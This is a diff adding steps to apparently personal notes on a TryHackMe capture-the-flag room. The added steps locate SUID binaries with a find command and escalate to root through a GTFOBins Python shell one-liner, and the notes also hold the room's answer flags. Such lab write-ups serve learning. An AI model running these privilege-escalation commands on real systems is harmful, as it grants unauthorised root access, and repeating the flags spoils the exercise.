@@ -38,12 +38,30 @@ Making Reverse Sheel - Tune connection
 
     THM{y0u_g0t_a_sh3ll}
 
+9 - Now we have access to sheel, let's escalate privileges to execute some executable like root 
 
+    One of hint is :
 
-10.10.150.31
+    " find / -user root -perm /4000 "
+
+    find / -user root -perm /4000 2>/dev/null (discard errors , like no permission)
+
+    This returns that we have access to '/usr/bin/python'  - tha is answers for a flag in CTF
+
+10 - The user www-data can execute python and in gtfobins.github.io we can see how execute it by root with SUID permission
+
+11 - By search 'python' SUID permission on Gtfobins, execute:
+
+    /usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+    Go to /root path and cat root.txt contents, this is a flag
+
+    THM{pr1v1l3g3_3sc4l4t10n}
+
 https://www.youtube.com/watch?v=Bn8ufPXOwAQ
 
 Concepts:
 #PortScaning
 #Gobuster
 #Reverse shell
+#Escalate Privileges
